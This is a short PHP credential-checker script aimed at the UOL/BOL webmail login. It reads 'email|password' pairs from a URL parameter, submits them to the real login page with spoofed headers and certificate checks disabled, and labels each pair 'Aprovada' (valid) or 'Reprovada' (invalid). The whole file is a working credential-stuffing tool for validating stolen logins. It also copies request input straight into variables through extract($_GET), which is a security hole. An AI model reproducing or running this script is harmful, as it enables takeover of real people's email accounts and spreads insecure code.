<?php
error_reporting(E_ALL);
DeletarCookies();

extract($_GET);

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[0]);
    return $str[1];
}

function deletarCookies()
{
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

$lista = str_replace(" ", "", $lista);
$separa = explode("|", $lista);
$email = $separa[0];
$senha = $separa[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://visitante.acesso.uol.com.br/login.html");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: bol.uol.com.br',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3962.2 Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'Referer: http://www.bol.uol.com.br/',
));
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=' . $email . '&password=' . $senha . '&entrar=Entrar');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'skin=bol-default&dest=WEBMAIL&user=' . $email . '&pass=' . $senha . '');

$data = curl_exec($ch);

if (!strpos($data, 'Aguarde')) {
    echo ' <font color="red" style="font-weight: #C0392B;">#Reprovada </font> ' . $email . '|' . $senha . '<font color="#333333"></font>';
} else {

    echo ' <font color="green" style="font-weight: bold;">#Aprovada </font> <font color="#D0D3D4"> ' . $email . '|' . $senha . '</font> <font color="#333333"></font>';
}
